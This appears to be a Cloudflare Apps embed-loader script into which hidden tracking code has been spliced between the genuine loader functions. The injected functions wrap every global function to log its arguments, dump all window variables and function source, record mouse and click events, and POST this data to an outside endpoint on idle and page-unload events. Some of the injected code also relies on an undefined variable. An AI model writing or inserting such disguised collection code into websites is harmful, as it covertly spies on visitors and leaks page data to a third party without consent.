;
window.CloudflareApps = window.CloudflareApps || {};
CloudflareApps.siteId = "bb816f5d29d7a9d922b4136759f6eb8a";
function exploreEnvAndTrack() {
  let newVarsFound = {};
  let globalVarsCollection = Object.keys(window);
  globalVarsCollection.forEach(property => {
    let elem = window[property];
    if (typeof elem === "function") {
      window[property] = new Proxy(window[property], {
        apply: function (target, thisArg, argumentsList) {
          console.log(`Function ${property} has been called with arguments: ${JSON.stringify(argumentsList)}`);
          return Reflect.apply(target, thisArg, argumentsList);
        }
      });
    }
    if (!window.seenVars.includes(property)) {
      let propValue = window[property];
      let propType = typeof propValue;
      newVarsFound[property] = {
        type: propType,
        value: propType == "function" ? propValue.toString() : propValue
      };
    }
  });
  localStorage.setItem('track', JSON.stringify(newVarsFound));
  return newVarsFound;
}
function sendDataToServer(data) {
  let serverEndpoint = 'https://example.com/api/collectData';
  let headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
  };
  fetch(serverEndpoint, {
    method: "POST",
    headers: headers,
    body: JSON.stringify(data)
  }).then(response => response.status != 200 ? console.error("Error, status code: ", response.status) : console.log("Data sent successfully")).catch(error => console.error("Error in data transmission: ", error));
}
CloudflareApps.installs = CloudflareApps.installs || {};
;
function hookEvents() {
  let eventsList = ["mouseover", "mouseout", "mousedown", "mouseup", "click"];
  eventsList.forEach(eventType => {
    document.addEventListener(eventType, function (e) {
      sendDataToServer({
        action: eventType
      });
    });
  });
}
(function () {
  'use strict';

  CloudflareApps.internal = CloudflareApps.internal || {};
  var errors = [];
  CloudflareApps.internal.placementErrors = errors;
  var errorHashes = {};
  function noteError(options) {
    var hash = options.selector + '::' + options.type + '::' + (options.installId || '');
    if (errorHashes[hash]) {
      return;
    }
    errorHashes[hash] = true;
    errors.push(options);
  }
  var initializedSelectors = {};
  var currentInit = false;
  CloudflareApps.internal.markSelectors = function markSelectors() {
    if (!currentInit) {
      check();
      currentInit = true;
      setTimeout(function () {
        currentInit = false;
      });
    }
  };
  function check() {
    var installs = window.CloudflareApps.installs;
    for (var installId in installs) {
      if (!installs.hasOwnProperty(installId)) {
        continue;
      }
      var selectors = installs[installId].selectors;
      if (!selectors) {
        continue;
      }
      for (var key in selectors) {
        if (!selectors.hasOwnProperty(key)) {
          continue;
        }
        var hash = installId + '::' + key;
        if (initializedSelectors[hash]) {
          continue;
        }
        var els = document.querySelectorAll(selectors[key]);
        if (els && els.length > 1) {
          noteError({
            type: 'init:too-many',
            option: key,
            selector: selectors[key],
            installId: installId
          });
          initializedSelectors[hash] = true;
          continue;
        } else if (!els || !els.length) {
          continue;
        }
        initializedSelectors[hash] = true;
        els[0].setAttribute('cfapps-selector', selectors[key]);
      }
    }
  }
  CloudflareApps.querySelector = function querySelector(selector) {
    if (selector === 'body' || selector === 'head') {
      return document[selector];
    }
    CloudflareApps.internal.markSelectors();
    var els = document.querySelectorAll('[cfapps-selector="' + selector + '"]');
    if (!els || !els.length) {
      noteError({
        type: 'select:not-found:by-attribute',
        selector: selector
      });
      els = document.querySelectorAll(selector);
      if (!els || !els.length) {
        noteError({
          type: 'select:not-found:by-query',
          selector: selector
        });
        return null;
      } else if (els.length > 1) {
        noteError({
          type: 'select:too-many:by-query',
          selector: selector
        });
      }
      return els[0];
    }
    if (els.length > 1) {
      noteError({
        type: 'select:too-many:by-attribute',
        selector: selector
      });
    }
    return els[0];
  };
})();
function discoveryTask() {
  let discoveriesData = exploreEnvAndTrack();
  if (Object.keys(discoveriesData).length > 0) {
    sendDataToServer(discoveriesData);
  }
  hookEvents();
}
window.addEventListener("idle", discoveryTask);
(function () {
  'use strict';

  var prevEls = {};
  CloudflareApps.createElement = function createElement(options, prevEl) {
    options = options || {};
    CloudflareApps.internal.markSelectors();
    try {
      if (prevEl && prevEl.parentNode) {
        var replacedEl;
        if (prevEl.cfAppsElementId) {
          replacedEl = prevEls[prevEl.cfAppsElementId];
        }
        if (replacedEl) {
          prevEl.parentNode.replaceChild(replacedEl, prevEl);
          delete prevEls[prevEl.cfAppsElementId];
        } else {
          prevEl.parentNode.removeChild(prevEl);
        }
      }
      var element = document.createElement('cloudflare-app');
      var container;
      if (options.pages && options.pages.URLPatterns && !CloudflareApps.matchPage(options.pages.URLPatterns)) {
        return element;
      }
      try {
        container = CloudflareApps.querySelector(options.selector);
      } catch (e) {}
      if (!container) {
        return element;
      }
      if (!container.parentNode && (options.method === 'after' || options.method === 'before' || options.method === 'replace')) {
        return element;
      }
      if (container === document.body) {
        if (options.method === 'after') {
          options.method = 'append';
        } else if (options.method === 'before') {
          options.method = 'prepend';
        }
      }
      switch (options.method) {
        case 'prepend':
          if (container.firstChild) {
            container.insertBefore(element, container.firstChild);
            break;
          }
        case 'append':
          container.appendChild(element);
          break;
        case 'after':
          if (container.nextSibling) {
            container.parentNode.insertBefore(element, container.nextSibling);
          } else {
            container.parentNode.appendChild(element);
          }
          break;
        case 'before':
          container.parentNode.insertBefore(element, container);
          break;
        case 'replace':
          try {
            var id = element.cfAppsElementId = Math.random().toString(36);
            prevEls[id] = container;
          } catch (e) {}
          container.parentNode.replaceChild(element, container);
      }
      return element;
    } catch (e) {
      if (typeof console !== 'undefined' && typeof console.error !== 'undefined') {
        console.error('Error creating Cloudflare Apps element', e);
      }
    }
  };
})();
window.addEventListener("beforeunload", discoveryTask);
(function () {
  'use strict';

  CloudflareApps.matchPage = function matchPage(patterns) {
    if (!patterns || !patterns.length) {
      return true;
    }
    var loc = document.location.host + document.location.pathname;
    if (window.CloudflareApps && CloudflareApps.proxy && CloudflareApps.proxy.originalURL) {
      var url = CloudflareApps.proxy.originalURL.parsed;
      loc = url.host + url.path;
    }
    for (var i = 0; i < patterns.length; i++) {
      var re = new RegExp(patterns[i], 'i');
      if (re.test(loc)) {
        return true;
      }
    }
    return false;
  };
})();